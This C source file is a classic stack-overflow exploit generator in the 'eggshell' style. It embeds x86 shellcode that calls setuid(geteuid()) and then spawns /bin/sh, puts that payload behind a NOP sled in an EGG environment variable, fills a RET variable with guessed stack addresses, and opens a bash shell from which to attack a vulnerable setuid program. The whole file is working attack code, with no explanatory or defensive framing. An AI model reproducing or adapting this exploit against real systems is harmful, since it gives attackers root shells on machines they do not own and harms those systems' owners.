#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>


#define DEFAULT_OFFSET          0
#define DEFAULT_BUFFER_SIZE     256
#define DEFAULT_EGG_SIZE        0x20000
#define NOP             0x90

char shellcode[] =
"\x31\xc0\xb0\x31\xcd\x80\x89\xc3\x89\xc1\x31\xc0\xb0\x46\xcd\x80" //setuid(geteuid())
"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
"\x80\xe8\xdc\xff\xff\xff/bin/sh";

unsigned long get_sp(void)
{
__asm__("movl %esp, %eax");
}

int main(int argc, char **argv)
{
char    *buff, *ptr, *egg;
long    *addr_ptr, addr;
int     offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE;
int     i, eggsize=DEFAULT_EGG_SIZE;

if ( argc > 1 ) bsize = atoi(argv[1]);
if ( argc > 2 ) offset = atoi(argv[2]);
if ( argc > 3 ) eggsize = atoi(argv[3]);

if ( !(buff = malloc(bsize)))
{
printf("Can't allocate memory for bsize\n");
exit(0);
}

if ( !(egg = malloc(eggsize)))
    {
    printf("Can't allocate memory for eggsize");
    exit(0);
    }

    addr = get_sp() - offset;
    printf("Using address: 0x%x\n", addr);

    ptr = buff;
    addr_ptr = (long *)ptr;
    for(i = 0; i < bsize; i+= 4)
    *(addr_ptr++) = addr;

    ptr = egg;
    for(i = 0; i < eggsize - strlen(shellcode) - 1; i++)
    *(ptr++) = NOP;

    for(i = 0; i < strlen(shellcode); i++)
    *(ptr++) = shellcode[i];

    buff[bsize - 1] = '\0';
    egg[eggsize - 1] = '\0';

    memcpy(egg, "EGG=", 4);
    putenv(egg);
    memcpy(buff, "RET=", 4);
    putenv(buff);
    system("/bin/bash");
}
